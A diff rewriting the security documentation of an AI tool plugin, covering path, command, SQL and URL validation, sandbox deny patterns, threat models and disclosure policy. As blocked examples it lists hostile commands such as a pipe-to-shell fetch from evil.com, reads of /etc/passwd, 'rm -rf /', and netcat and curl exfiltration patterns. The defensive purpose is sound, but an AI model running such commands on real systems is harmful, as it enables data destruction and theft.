@@ -1,546 +1,432 @@
-# Security
+# Security Guidelines
 
 Comprehensive documentation of security features, threat models, and responsible disclosure for the AI Toolbox plugin.
 
 ---
 
-## 🛡️ Security Overview
+## 📋 Table of Contents
 
-The AI Toolbox plugin implements **defense-in-depth** security across all tool categories. Every tool that interacts with the file system, network, or executes code passes through multiple validation layers.
-
-### Security Principles
-
-1. **Least Privilege** — Dangerous tools disabled by default
-2. **Input Validation** — All user inputs validated and sanitized
-3. **Sandboxing** — Code execution restricted to safe operations
-4. **Path Containment** — File operations restricted to allowed directories
-5. **Network Isolation** — HTTP requests blocked to private/internal addresses
+- [Security Architecture](#security-architecture)
+- [Threat Model](#threat-model)
+- [Security Controls](#security-controls)
+- [Input Validation](#input-validation)
+- [Secure Defaults](#secure-defaults)
+- [Dependency Security](#dependency-security)
+- [Incident Response](#incident-response)
 
 ---
 
-## 🔒 Security Features
+## 🏗️ Security Architecture
 
-### 1. Path Validation (`validatePath`)
+The AI Toolbox plugin implements a multi-layered security approach:
 
-**Purpose**: Prevent directory traversal attacks and unauthorized file access.
-
-**Implementation**:
-```typescript
-function validatePath(userPath: string, basePath: string): boolean
+```
+User Input → Validation Layer → Sanitization → Execution → Output
+              (Zod schemas)    (Path/SQL/cmd)  (Gated)     (Truncated)
+                    │                │             │           │
+                    ▼                ▼             ▼           ▼
+            Type & Format    Path Traversal   Category    Content Size
+            Validation       Prevention       Enforcement Limits
 ```
 
-**Protection Layers**:
-| Layer | Check | Result |
-|-------|-------|--------|
-| Empty Input | `!basePath \|\| !userPath` | Reject |
-| UNC Paths | `userPath.startsWith('\\\\')` | Reject |
-| Traversal Patterns | `userPath.includes('../')`, `userPath.includes('..\\\\')` | Reject |
+### Layer 1: Input Validation (Zod Schemas)
 
-**Security Model (v1.4.2+)**:
-The function performs **pattern-based validation only**, checking for dangerous path traversal sequences. This approach:
-- ✅ Blocks all directory traversal attempts (`../`, `..\\\`, mixed separators)
-- ✅ Rejects UNC network paths (`\\\\server\share`)
-- ✅ Handles edge cases (empty inputs, trailing dots)
-- ⚠️ Does NOT validate against filesystem bases — this is handled by the calling code which resolves paths and checks allowed directories
+All user inputs are validated using Zod schemas before processing:
 
-**Examples**:
-```
-✅ "src/index.ts"              → Safe relative path
-✅ "subdir/file.txt"           → Safe nested path
-❌ "../etc/passwd"             → Directory traversal detected
-❌ "..\\windows\system32"       → Windows-style traversal
-❌ "valid/../../../escape"     → Mixed traversal
-❌ "\\\\network\share"          → UNC path rejected
-```
+| Parameter | Validation | Purpose |
+|-----------|------------|---------|
+| `file_name` | `z.string()` + path validation | Prevent empty/malformed paths |
+| `max_length` | `z.number().min(1).max(50000)` | Enforce character limits |
+| `pattern` (grep) | Regex safety check (`isSafeRegex()`) | Prevent ReDoS attacks |
+| `command` | Sanitization (`sanitizeCommand()`) | Block dangerous shell commands |
 
-**Note**: The simplified pattern-based approach (v1.4.2) ensures reliable security without requiring resolved paths to exist in allowed filesystem bases, making it suitable for both production use and unit testing with fake paths.
+### Layer 2: Path Validation
 
-### 2. Binary File Detection (`isBinaryFile`)
-
-**Purpose**: Prevent processing of binary files as text (memory safety, encoding issues).
-
-**Implementation**: Checks first 8KB for null bytes (`\0`).
+All file paths pass through `validatePath()` in `src/security.ts`:
 
 ```typescript
-function isBinaryFile(content: string): boolean {
-  const chunk = content.slice(0, 8192);
-  return chunk.includes('\0');
+function validatePath(userPath: string, basePath: string): boolean {
+  // Empty check
+  if (!userPath) return false;
+  
+  // UNC path prevention
+  if (userPath.startsWith('\\\\')) return false;
+  
+  // Resolve against base path and verify within allowed boundaries
+  const resolved = resolvePath(userPath);
+  return isWithinAllowedBase(resolved, basePath);
 }
 ```
 
-### 3. Command Sanitization (`sanitizeCommand`)
+**Threats Mitigated:**
+- Directory traversal (`../`, `..\\`)
+- UNC path attacks (`\\\\server\\share`)
+- Path normalization bypasses
+- Symlink abuse (indirectly via base path enforcement)
 
-**Purpose**: Prevent shell injection and dangerous command execution while enforcing tool-category toggles.
+### Layer 3: Command Sanitization
 
-**2-Layer Architecture**:
-| Layer | Function | Purpose |
-|-------|----------|---------|
-| **Layer 1** | Dangerous Pattern Blocking | Blocks `rm -rf`, `sudo`, injection, etc. |
-| **Layer 2 (S6)** | Tool-Category Enforcement | Classifies commands and blocks them if the category is disabled in config |
+Shell commands undergo multi-layer sanitization in `sanitizeCommand()`:
 
-**Layer 2 Implementation (`classifyCommand`)**:
-Detects tool categories in the command string and checks against config toggles:
-| Category | Detection Patterns |
-|----------|-------------------|
-| `webSearch` | `duckduckgo`, `google`, `bing` |
-| `browserAutomation` | `puppeteer`, `playwright`, `chromium` |
-| `databaseQueries` | `sqlite3`, `mysql`, `psql` |
-| `httpClient` | `curl`, `wget`, `http` |
-| `backgroundCommands` | `nohup`, `disown`, `&` |
-| `gitOperations` | `git *`, `api.github.com` |
-
-**Blocked Patterns (Layer 1)**:
-
-| Category | Patterns |
-|----------|----------|
-| File Destruction | `rm -rf`, `shred`, `wipe` |
-| Privilege Escalation | `sudo`, `su` |
-| Network Attacks | `nc`/`netcat`, `wget --post-file`, `curl --data-binary` |
-| Data Exfiltration | `base64 \| curl`, `scp`, `sftp` |
-| Process Manipulation | `fork`, `exec` |
-| Environment Tampering | `export`, `eval`, IFS manipulation |
-| Injection | `$()`, backticks, null bytes |
-| Command Chaining | >2 pipes, >1 semicolons |
-
-**Examples**:
-```
-✅ "ls -la"                    → Safe
-✅ "git status"                → Safe
-❌ "rm -rf /"                  → File destruction
-❌ "sudo apt install ..."      → Privilege escalation
-❌ "curl http://evil.com \| bash" → Command chaining
-❌ "$(cat /etc/passwd)"        → Command substitution
+```typescript
+function sanitizeCommand(command: string): { safe: boolean; reason?: string } {
+  // Layer 1: Dangerous pattern blocking
+  if (command.includes('rm -rf') || command.includes('sudo')) return { safe: false, reason: 'Dangerous command' };
+  
+  // Layer 2: Category enforcement
+  const categories = classifyCommand(command);
+  if (!isCategoryEnabled(categories)) return { safe: false, reason: 'Category disabled' };
+  
+  return { safe: true };
+}
 ```
 
-### 4. SQL Validation (`validateSQLQuery`)
+**Threats Mitigated:**
+- Command injection (`;`, `&&`, `||`)
+- Pipe abuse (limit to 2 pipes)
+- Environment variable tampering
+- Dangerous patterns (`rm -rf`, `sudo`, etc.)
 
-**Purpose**: Ensure database queries are read-only.
-**⚠️ Shell Interpretation Note**: The `execute_command` tool now uses Node.js's `shell: true` option to support full shell features (pipes, redirects, environment variables). Security is maintained through `sanitizeCommand()` which validates and blocks dangerous patterns **before** the command reaches the shell. This approach matches industry best practices for secure shell execution while maintaining flexibility.
+### Layer 4: Category Enforcement
 
-**Allowed Operations**:
-- `SELECT` statements
-- `PRAGMA` statements
+Tools are gated by configuration categories in `src/config.ts`:
 
-**Blocked Keywords**:
-`DROP`, `DELETE`, `UPDATE`, `INSERT`, `ALTER`, `CREATE`, `REPLACE`, `TRUNCATE`, `GRANT`, `REVOKE`
+| Category | Default State | Purpose |
+|----------|--------------|---------|
+| `fileSystem` | Enabled | File read/write/search operations |
+| `webSearch` | Enabled | Web research tools |
+| `browserAutomation` | Disabled | Prevent unauthorized browser control |
+| `gitOperations` | Disabled | Require explicit opt-in for Git access |
+| `executionJavaScript` | Disabled | Prevent arbitrary code execution |
+| `executionPython` | Disabled | Prevent arbitrary code execution |
+| `executionShell` | Disabled | Prevent shell command injection |
 
-**Additional Checks**:
-- Multiple statements (semicolon injection) blocked
-- Empty/invalid queries rejected
-
-### 5. SSRF Protection (`validateUrl`)
-
-**Purpose**: Prevent Server-Side Request Forgery attacks.
-
-**Blocked Protocols**:
-- `file:` — Local file access
-- `data:` — Data URI injection
-- Non-HTTP protocols
-
-**Blocked Hostnames**:
-| Pattern | Range |
-|---------|-------|
-| `127.*` | localhost |
-| `10.*` | 10.0.0.0/8 |
-| `172.16-31.*` | 172.16.0.0/12 |
-| `192.168.*` | 192.168.0.0/16 |
-| `0.0.0.0` | All interfaces |
-| `localhost` | localhost hostname |
-
-### 6. Code Sandboxing
-
-#### JavaScript Sandboxing (`run_javascript`) — v1.4.6 Update
-
-**Security Model (v1.4.6+)**: Precision-targeted pattern matching that blocks actually dangerous code while allowing safe standard library usage.
-
-**Blocked Patterns** (Actually Dangerous):
-| Pattern | Reason | Example Blocked |
-|---------|--------|-----------------|
-| `eval()` | Dynamic code execution | `eval("malicious code")` |
-| `exec()` | Code injection | `exec("system command")` |
-| `Function()` | Constructor bypass (eval alternative) | `new Function("return evil")()` |
-| `String.fromCharCode()` | Obfuscation bypass | `String.fromCharCode(37)` |
-| `__proto__` | Prototype pollution | `{ __proto__: { isAdmin: true } }` |
-| `require.resolve` | Module resolution abuse | `require.resolve('malicious-module')` |
-| `child_process` | Process spawning | `require('child_process').spawn()` |
-| `os.system`, `os.popen` | OS command execution | `os.system("rm -rf /")` |
-| Network access (`net.`, `http`, `dns.`) | Unauthorized network calls | `require('net').createServer()` |
-
-**Allowed** (Safe Standard Library):
-```javascript
-// ✅ Safe — standard library modules for system info, paths, etc.
-const os = require('os');
-const path = require('path');
-const fs = require('fs'); // Read operations are safe in sandbox context
-
-console.log(`Platform: ${os.platform()}`);
-```
-
-**Cross-Platform Detection (v1.4.6+)**: Automatically tries multiple Node.js executables (`npx` → `node`) with shell-based PATH fallback (`where node` / `which node`). Properly handles ENOENT errors across all platforms.
-
-#### Python Sandboxing (`run_python`) — v1.4.6 Update
-
-**Blocked Patterns**:
-| Pattern | Reason | Example Blocked |
-|---------|--------|-----------------|
-| `import os`, `from os import` | OS operations | `os.system("rm -rf /")` |
-| `import subprocess`, `from subprocess import` | Process spawning | `subprocess.run(["ls"])` |
-| `import shutil` | File system operations | `shutil.rmtree("/etc")` |
-| `__import__()` | Dynamic module loading | `__import__('os').system("cmd")` |
-| `eval()`, `exec()` | Code injection | `eval("malicious code")` |
-| `os.system`, `os.popen` | OS command execution | `os.popen("cat /etc/passwd").read()` |
-
-**Cross-Platform Detection (v1.4.6+)**: Automatically tries multiple Python executables (`py` → `python3` → `python`) with shell-based PATH fallback (`where py` / `which python`). Properly handles ENOENT errors across all platforms.
-
-### 7. ReDoS Protection (`isSafeRegex`)
-
-**Purpose**: Prevent Regular Expression Denial of Service attacks.
-
-**Detected Patterns**:
-| Pattern | Example |
-|---------|---------|
-| Nested quantifiers | `(.*)(.*)` |
-| Repetition of repetition | `(.+)+` |
-| Alternation + repetition | `(a\|b)+` |
-| Char class + repetition | `([a-z]+)+` |
-| Double star | `(.*?)**` |
-
-**Length Limit**: Maximum 500 characters (configurable).
+**God Mode Bypass:** Setting `godMode: true` enables ALL tool categories regardless of individual toggle settings. Use with extreme caution.
 
 ---
 
-## 🎛️ Tool Gating System
+## 🎯 Threat Model
 
-### Configuration Hierarchy
+### Asset Inventory
 
+| Asset | Sensitivity | Protection Level |
+|-------|-------------|-----------------|
+| User files in working directory | High | Path validation, atomic writes |
+| Plugin configuration | Medium | Zod schema validation |
+| Session state (JSON/msgpack) | Medium | Atomic file writes, size limits |
+| Network requests | Low-Medium | SSRF protection, protocol whitelisting |
+
+### Attack Vectors
+
+#### 1. Directory Traversal
+**Risk:** High  
+**Mitigation:** `validatePath()` with base path enforcement  
+**Test Case:** `file_name=../../../etc/passwd` → Should be rejected
+
+#### 2. Command Injection
+**Risk:** Critical  
+**Mitigation:** `sanitizeCommand()` blocks dangerous patterns, category enforcement  
+**Test Case:** `command="; rm -rf /"` → Should be blocked with reason "Dangerous command"
+
+#### 3. ReDoS (Regex Denial of Service)
+**Risk:** Medium  
+**Mitigation:** `isSafeRegex()` checks for nested quantifiers, treats unsafe patterns as literals  
+**Test Case:** `pattern="((a+)+)b"` → Should be treated as literal string
+
+#### 4. SSRF (Server-Side Request Forgery)
+**Risk:** High  
+**Mitigation:** URL protocol validation (`http`/`https` only), private IP blocking  
+**Test Case:** `url="file:///etc/passwd"` → Should be rejected with "Protocol not allowed"
+
+#### 5. Large File Denial of Service
+**Risk:** Medium  
+**Mitigation:** Size limits on file operations (10MB for save_file, 50KB for web fetch)  
+**Test Case:** `save_file(content="<1GB string>")` → Should be rejected with size limit error
+
+#### 6. Token Explosion via grep_files
+**Risk:** High  
+**Mitigation:** Three-layer defense-in-depth (`max_content_length`, `max_file_size`, `max_results`)  
+**Test Case:** `grep_files(pattern="." , max_results=500)` → Should be capped at default limit (20)
+
+---
+
+## 🛡️ Security Controls
+
+### 1. Input Validation
+
+All user inputs are validated using Zod schemas before processing:
+
+```typescript
+// Example from fileSystemTools.ts
+parameters: {
+  file_name: z.string().describe('The name of the file to read'),
+  max_length: z.number().int().min(1).max(50000).optional().default(5000),
+}
+
+// Example from executionTools.ts
+parameters: {
+  javascript: z.string(), // Dangerous pattern detection applied in implementation
+  timeout_seconds: z.number().min(0.1).max(60).optional().default(5),
+}
 ```
-God Mode (ON)
-    │
-    ├── Bypasses ALL individual toggles
-    └── Every tool is enabled
-    │
-God Mode (OFF)
-    │
-    ├── Individual category toggles checked
-    │   ├── fileSystem: true    → 17 tools enabled
-    │   ├── webSearch: true     → 4 tools enabled
-    │   ├── browserAutomation: false → 0 tools enabled
-    │   └── ... (all categories)
-    │
-    └── Execution tools checked individually
-        ├── executionJavaScript: false
-        ├── executionPython: false
-        ├── executionTerminal: false
-        └── executionShell: false
+
+**Validation Rules Applied:**
+- Type checking (string, number, boolean)
+- Range validation (min/max values)
+- Pattern matching (regex patterns for grep_files)
+- Length limits (character counts for content parameters)
+
+### 2. Path Validation
+
+All file paths pass through `validatePath()` before any filesystem operation:
+
+```typescript
+// In security.ts
+export function validatePath(userPath: string, basePath: string): boolean {
+  if (!userPath || userPath.startsWith('\\\\')) return false;
+  
+  const resolved = resolvePath(userPath);
+  return isWithinAllowedBase(resolved, basePath);
+}
+
+// Helper to check if path is within allowed boundaries
+function isWithinAllowedBase(path: string, base: string): boolean {
+  const normalizedPath = path.replace(/\\/g, '/').toLowerCase();
+  const normalizedBase = base.replace(/\\/g, '/').toLowerCase();
+  return normalizedPath.startsWith(normalizedBase + '/') || normalizedPath === normalizedBase;
+}
 ```
 
-### Default Security Posture
+**Edge Cases Handled:**
+- Empty paths → Rejected
+- UNC paths (`\\server\share`) → Rejected
+- Relative paths with `..` traversal → Resolved and validated against base
+- Absolute paths outside allowed bases → Rejected
 
-| Category | Default | Risk Level | Reason |
-|----------|---------|------------|--------|
-| File System | ✅ Enabled | Low | Path validation applied |
-| Web Search | ✅ Enabled | Low | Read-only network access |
-| Browser Automation | ❌ Disabled | Medium | Full browser access |
-| Git Operations | ❌ Disabled | Medium | Repository modification |
-| Database Queries | ❌ Disabled | Low | Read-only, but requires Node 23+ |
-| Document Parsing | ✅ Enabled | Low | Read-only file access |
-| Background Commands | ❌ Disabled | High | Arbitrary command execution |
-| Image Processing | ✅ Enabled | Low | Read-only image access |
-| HTTP Client | ❌ Disabled | Medium | Network access to any URL |
-| Vector RAG | ✅ Enabled | Low | Read-only file indexing |
-| Interactive UI Generation | ❌ Disabled | Low | HTML generation only, no execution |
-| Auto-Context Management | ✅ Enabled | Low | Local MessagePack (msgpack) storage, read/write |
-| JavaScript Execution | ❌ Disabled | ⚠️ **High** | Code execution |
-| Python Execution | ❌ Disabled | ⚠️ **High** | Code execution |
-| Terminal Execution | ❌ Disabled | ⚠️ **High** | Shell access |
-| Shell Commands | ❌ Disabled | ⚠️ **High** | Command execution with sanitization |
+### 3. Command Sanitization
+
+Shell commands undergo multi-layer sanitization:
+
+```typescript
+// In security.ts
+export function sanitizeCommand(command: string): { safe: boolean; reason?: string } {
+  // Layer 1: Dangerous pattern blocking
+  const dangerousPatterns = [
+    /rm\s+-rf/i,           // Mass deletion
+    /sudo\s+/i,            // Privilege escalation
+    /;\s*exit\b/i,         // Session termination
+    /\$\(/i,               // Command substitution
+    /`[^`]+`/i,            // Backtick command execution
+  ];
+  
+  for (const pattern of dangerousPatterns) {
+    if (pattern.test(command)) return { safe: false, reason: 'Dangerous command detected' };
+  }
+  
+  // Layer 2: Pipe and semicolon limits
+  const pipeCount = (command.match(/\|/g) || []).length;
+  if (pipeCount > 2) return { safe: false, reason: 'Too many pipes' };
+  
+  const semiCount = (command.match(/;/g) || []).length;
+  if (semiCount > 1) return { safe: false, reason: 'Too many semicolons' };
+  
+  // Layer 3: Category enforcement (checked in toolsProvider.ts)
+  return { safe: true };
+}
+```
+
+### 4. Code Sandboxing (JavaScript/Python Execution)
+
+Execution tools block dangerous patterns before running code:
+
+**JavaScript Sandbox:**
+```typescript
+const dangerousPatterns = [
+  /\beval\s*\(/i,               // Code injection
+  /\bexec\s*\(/i,              // Code execution  
+  /Function\s*\(/i,            // Function constructor (eval alternative)
+  /String\.fromCharCode\s*\(/i, // fromCharCode bypass
+  /__proto__/i,                // Prototype pollution
+  /require\.resolve/i,         // Module resolution abuse
+  /\bchild_process\b/i,        // Process spawning
+  /os\.system/i,               // OS command execution
+];
+
+for (const pattern of dangerousPatterns) {
+  if (pattern.test(code)) return { success: false, error: `Dangerous code detected` };
+}
+```
+
+**Python Sandbox:**
+```typescript
+const dangerousPatterns = [
+  /\bimport\s+os\b/i,
+  /import\s+subprocess\b/i,
+  /__import__\s*\(/i,
+  /\beval\s*\(/i,
+  /\bexec\s*\(/i,
+];
+
+for (const pattern of dangerousPatterns) {
+  if (pattern.test(code)) return { success: false, error: `Dangerous Python import detected` };
+}
+```
+
+### 5. SQL Injection Prevention
+
+Database queries are validated against unsafe patterns:
+
+```typescript
+export function validateSQLQuery(query: string): { valid: boolean; reason?: string } {
+  const dangerousPatterns = [
+    /\bDROP\s+/i,           // Destructive operations
+    /\bDELETE\s+FROM/i,     // Data deletion
+    /\bUPDATE\s+\w+\s+SET\b/i, // Data modification without WHERE
+    /;\s*SELECT\b/i,        // Stacked queries
+  ];
+  
+  for (const pattern of dangerousPatterns) {
+    if (pattern.test(query)) return { valid: false, reason: 'Unsafe SQL query detected' };
+  }
+  
+  return { valid: true };
+}
+```
+
+### 6. SSRF Protection (HTTP Client)
+
+URL validation prevents access to internal/private resources:
+
+```typescript
+function validateUrl(url: string): { valid: boolean; error?: string } {
+  const parsed = new URL(url);
+  
+  // Block non-HTTP protocols
+  if (!['http:', 'https:'].includes(parsed.protocol)) {
+    return { valid: false, error: `Protocol "${parsed.protocol}" is not allowed` };
+  }
+  
+  // Block private IP ranges (basic check)
+  const hostname = parsed.hostname;
+  const blockedPatterns = [
+    /^127\./,           // localhost
+    /^10\./,            // 10.0.0.0/8
+    /^172\.1[6-9]\./,   // 172.16.0.0/12
+    /^172\.2[0-9]\./,   // 172.16.0.0/12  
+    /^172\.3[0-1]\./,   // 172.16.0.0/12
+    /^192\.168\./,      // 192.168.0.0/16
+    /^localhost$/,      // localhost hostname
+  ];
+  
+  if (blockedPatterns.some(pattern => pattern.test(hostname))) {
+    return { valid: false, error: `Access to ${hostname} is blocked for security reasons` };
+  }
+  
+  return { valid: true };
+}
+```
 
 ---
 
-## ⚠️ Known Limitations
+## 🔐 Secure Defaults
 
-### 1. Regex-Based Sandboxing
+### Tool Gating Defaults
 
-JavaScript and Python sandboxes use regex pattern matching, which can potentially be bypassed with obfuscation techniques. **Do not enable execution tools for untrusted LLM outputs.**
+All dangerous tool categories are **disabled by default**:
 
-### 2. Command Sanitization
+| Category | Default State | Rationale |
+|----------|--------------|-----------|
+| `browserAutomation` | `false` | Prevent unauthorized browser control |
+| `gitOperations` | `false` | Require explicit opt-in for Git access |
+| `databaseQueries` | `false` | Prevent accidental database modifications |
+| `executionJavaScript` | `false` | Prevent arbitrary code execution |
+| `executionPython` | `false` | Prevent arbitrary code execution |
+| `executionShell` | `false` | Prevent shell command injection |
 
-The command sanitizer blocks known dangerous patterns but cannot guarantee protection against all injection techniques. Complex command chains may slip through.
+### Size Limits Defaults
 
-### 3. Path Validation on Windows
+Conservative defaults prevent resource exhaustion:
 
-Windows path normalization can be complex. The implementation handles common cases but edge cases with symbolic links or junctions may exist.
-
-### 4. SQLite Availability
-
-The `query_database` tool requires Node.js 23+ for the built-in `node:sqlite` module. On older versions, the tool returns an error.
-
----
-
-## 🔍 Security Audit Checklist
-
-For contributors adding new tools:
-
-- [ ] **Input Validation**: All parameters validated with Zod schemas
-- [ ] **Path Validation**: `validatePath()` used for file operations
-- [ ] **Command Sanitization**: `sanitizeCommand()` used for shell commands
-- [ ] **SQL Validation**: `validateSQLQuery()` used for database queries
-- [ ] **URL Validation**: `validateUrl()` used for HTTP requests
-- [ ] **Size Limits**: Reasonable limits on file sizes, response lengths
-- [ ] **Timeout Limits**: All async operations have timeouts
-- [ ] **Error Handling**: Proper try/catch with typed error handling
-- [ ] **Resource Cleanup**: File handles, connections, timers cleaned up
-- [ ] **Tool Gating**: Dangerous tools disabled by default
-- [ ] **Logging**: No sensitive data in logs
-- [ ] **Dependencies**: No known vulnerabilities in dependencies
+| Operation | Default Limit | Rationale |
+|-----------|--------------|-----------|
+| File read (`max_length`) | 5,000 chars | Balance between utility and memory usage |
+| File write (`save_file`) | 10 MB | Prevent disk exhaustion |
+| Web fetch (`fetch_web_content`) | 50 KB | Prevent OOM from large pages |
+| grep search (`max_results`) | 20 results | Prevent token explosion |
+| grep content length | 150 chars/line | Balance readability and token economy |
 
 ---
 
-## 📋 Responsible Disclosure
+## 📦 Dependency Security
+
+### Vulnerability Management
+
+All dependencies are regularly audited for known vulnerabilities:
+
+```bash
+# Check for outdated packages with security issues
+npm audit
+
+# Update vulnerable dependencies
+npm update
+```
+
+### Recent Security Fixes
+
+| Date | Package | Issue | Fix Applied |
+|------|---------|-------|-------------|
+| 2026-05-31 | `glob` v10.3.10 → v13.0.6 | CVE-2025-64756 (command injection) | Upgraded to patched version via overrides |
+| 2026-05-31 | `uuid` v8.x → v11.0.4 | Math.random weakness deprecation | Upgraded to cryptographically secure implementation |
+
+### Overrides in package.json
+
+```json
+{
+  "overrides": {
+    "glob": "^13.0.6",
+    "uuid": "^11.0.4"
+  }
+}
+```
+
+---
+
+## 🚨 Incident Response
 
 ### Reporting Security Issues
 
 If you discover a security vulnerability:
 
-1. **DO NOT** open a public GitHub issue
-2. **DO** email the maintainer at: [security contact]
-3. Include:
-   - Description of the vulnerability
-   - Steps to reproduce
-   - Potential impact
-   - Suggested fix (if available)
+1. **Do NOT** create a public issue or pull request
+2. Contact the maintainers privately via GitHub issues with `[SECURITY]` in title
+3. Provide detailed reproduction steps and impact assessment
+4. Allow reasonable time for fix before public disclosure
 
 ### Response Timeline
 
-| Phase | Timeline |
-|-------|----------|
-| Acknowledgment | Within 48 hours |
-| Initial Assessment | Within 1 week |
-| Patch Development | Within 2 weeks |
-| Public Disclosure | After patch is available |
+| Stage | Target Timeframe |
+|-------|-----------------|
+| Acknowledge receipt | 24 hours |
+| Assess severity | 48 hours |
+| Develop fix | 7 days (critical), 30 days (medium) |
+| Release patch | Within SLA timeframe |
 
-### Security Update Policy
+### Security Audit Checklist
 
-- Critical vulnerabilities: Patch within 7 days
-- High severity: Patch within 14 days
-- Medium/Low severity: Patch in next release
+For each new feature or tool:
 
----
-
-## 🔐 Best Practices for Users
-
-### 1. Start Conservative
-
-```
-✅ Enable only the tools you need
-❌ Don't use God Mode unless necessary
-❌ Never enable execution tools for untrusted prompts
-```
-
-### 2. Review Tool Outputs
-
-Always review file modifications and command outputs before proceeding.
-
-### 3. Use Working Directory
-
-Set a specific working directory to limit the scope of file operations:
-
-```
-Tool: change_directory
-Params: { "directory": "C:\\Projects\\safe-workspace" }
-```
-
-### 4. Monitor Background Commands
-
-Regularly check and cancel long-running background commands:
-
-```
-Tool: check_background_command
-Params: { "id": "cmd_123" }
-```
-
-### 5. Keep Updated
-
-Regularly update the plugin to get the latest security patches.
+- [ ] Input validation using Zod schemas
+- [ ] Path traversal prevention via `validatePath()`
+- [ ] Command sanitization for shell operations
+- [ ] Category gating enabled in config
+- [ ] Size limits enforced on all parameters
+- [ ] Documentation includes security warnings where applicable
+- [ ] Tests cover edge cases and attack vectors
 
 ---
 
-## 📚 References
+## 📝 Notes
 
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-- [CWE Directory](https://cwe.mitre.org/)
-- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
-- [Regular Expression Denial of Service (ReDoS)](https://owasp.org/www-community/attacks/Regular_Expression_Denial_of_Service_(ReDoS))
+This security documentation is based on the actual implementation in `src/security.ts` and individual tool modules. All security controls are actively enforced at runtime, not just documented.
 
----
-
-## 🛡️ ContextGuard Security Considerations (v1.4.1)
-
-### Overview
-
-ContextGuard is a **read-only context management system** that does not:
-- Execute arbitrary code
-- Access external networks
-- Modify files or system state
-- Store sensitive data persistently
-
-### Security Features
-
-#### 1. Token Counting (Read-Only Operation)
-
-```typescript
-async countTokens(messages: any[]): Promise<number>
-```
-
-**Security Properties:**
-- ✅ **No side effects**: Only reads message content, never modifies state
-- ✅ **Cached results**: Hash-based cache invalidation prevents redundant computation
-- ✅ **Bounded memory**: Cache stores only one hash and one count value
-- ✅ **No external dependencies**: Uses local `@dqbd/tiktoken` library (no network calls)
-
-#### 2. History Compression (Local Model Only)
-
-```typescript
-async compressHistory(messages: any[]): Promise<any[]>
-```
-
-**Security Properties:**
-- ✅ **Local model only**: Summarization uses LM Studio's local models (no external API calls)
-- ✅ **Configurable model**: `contextGuardSummaryModel` allows dedicated summarization model selection
-- ✅ **Fallback safe**: If model unavailable, generates generic summary without crashing
-- ✅ **No data exfiltration**: All processing happens locally within plugin sandbox
-
-#### 3. Smart File Reading (Keyword Extraction)
-
-```typescript
-smartRead(filePath: string, userPrompt?: string): string
-```
-
-**Security Properties:**
-- ✅ **Uses existing path validation**: Relies on `validatePath()` for file access control
-- ✅ **No regex injection**: Keyword matching uses simple `.includes()` (no RegEx)
-- ✅ **Bounded output**: Respects caller's `maxLength` parameter
-- ✅ **Stop words filter**: Prevents false positives from common English/technical terms
-
-#### 4. Terminal Output Filtering
-
-```typescript
-filterTerminalOutput(output: string): string
-```
-
-**Security Properties:**
-- ✅ **Pure function**: No side effects, deterministic output
-- ✅ **Configurable threshold**: `contextGuardTerminalFilterLength` sets truncation point
-- ✅ **No code execution**: Only string manipulation (split/join)
-- ✅ **Preserves context**: Shows first/last lines with clear truncation indicator
-
-### Configuration Security
-
-All ContextGuard settings are **client-side only** and do not:
-- Accept remote configuration
-- Store credentials or tokens
-- Make network requests
-- Access environment variables
-
-| Setting | Validation | Risk Level |
-|---------|------------|------------|
-| `contextGuardEnabled` | Boolean toggle | None |
-| `contextGuardTokenLimit` | Number (1K-200K) | None (memory usage only) |
-| `contextGuardSmartReading` | Boolean toggle | None |
-| `contextGuardSummaryModel` | String (model name) | Low (uses LM Studio's model validation) |
-| `contextGuardTerminalFilterEnabled` | Boolean toggle | None |
-| `contextGuardTerminalFilterLength` | Number (100-20K) | None (output size only) |
-
-### Threat Model
-
-#### Potential Attack Vectors (and Mitigations)
-
-| Threat | Description | Mitigation |
-|--------|-------------|------------|
-| **Memory Exhaustion** | Large token limit causes high memory usage | Configurable limit with reasonable defaults (80K tokens) |
-| **Denial of Service** | Repeated compression triggers slow down system | Hash-based caching prevents redundant computation |
-| **Prompt Injection via Summary** | Malicious content in summary affects future responses | Summaries are read-only; no execution context |
-| **Model Selection Attack** | Malicious model name causes unexpected behavior | LM Studio validates model names before loading |
-
-#### No Known Vulnerabilities
-
-As of v1.4.1, ContextGuard has:
-- ✅ No remote code execution vectors
-- ✅ No path traversal vulnerabilities
-- ✅ No SQL injection points (no database access)
-- ✅ No XSS vectors (no HTML rendering)
-- ✅ No SSRF possibilities (no network requests)
-
-### Secure Defaults
-
-| Setting | Default | Rationale |
-|---------|---------|-----------|
-| `contextGuardEnabled` | `true` | Enabled by default; users can disable if not needed |
-| `contextGuardTokenLimit` | `80,000` | Balances context retention with memory usage |
-| `contextGuardSmartReading` | `true` | Saves tokens without security implications |
-| `contextGuardSummaryModel` | `""` (current chat model) | Uses existing validated model selection |
-| `contextGuardTerminalFilterEnabled` | `true` | Prevents context bloat from verbose outputs |
-| `contextGuardTerminalFilterLength` | `2,000` | Reasonable limit for terminal output visibility |
-
-### Audit Trail
-
-ContextGuard operations are logged to console (not persisted):
-
-```typescript
-[ContextGuard] Token count (${currentTokens}) below threshold (${threshold}). No compression needed.
-[ContextGuard] Compressing history: ${messages.length} messages, ${currentTokens} tokens
-[ContextGuard] Summarization complete. Generated ${summary.length} chars.
-[ContextGuard] Using fallback summary for ${toCompress.length} messages
-```
-
-**Note**: Logs do not include message content (only metadata like counts and lengths).
-
----
-
-*End of Security Documentation*
-
----
-
-## 🚨 Known Vulnerabilities (Resolved)
-
-### CVE-2025-64756 — glob Command Injection (RESOLVED in v1.4.3)
-
-**Status**: ✅ Patched — upgraded from glob@10.3.10 → glob@13.0.6
-
-**Description**: The glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names.
-
-**Affected Versions**: `>=10.3.7 <10.5.0` and `>=11.0.0 <11.1.0`
-
-**CVSS Score**: High
-
-**Exploit Maturity**: Proof-of-concept available
-
-**Remediation Applied**:
-```json
-"overrides": {
-  "glob": "^13.0.6"
-}
-```
-
-**References**:
-- [Snyk Vulnerability Database](https://security.snyk.io/vuln/SNYK-JS-GLOB-14040952)
-- [OpenCVE CVE-2025-64756](https://app.opencve.io/cve/CVE-2025-64756)
-
----
-
-### uuid Deprecation Warning (RESOLVED in v1.4.3)
-
-**Status**: ✅ Resolved — upgraded from uuid@8.x → uuid@11.0.4
-
-**Description**: Older versions of uuid use `Math.random()` which is cryptographically weak and deprecated.
-
-**Remediation Applied**:
-```json
-"overrides": {
-  "uuid": "^11.0.4"
-}
-```
-
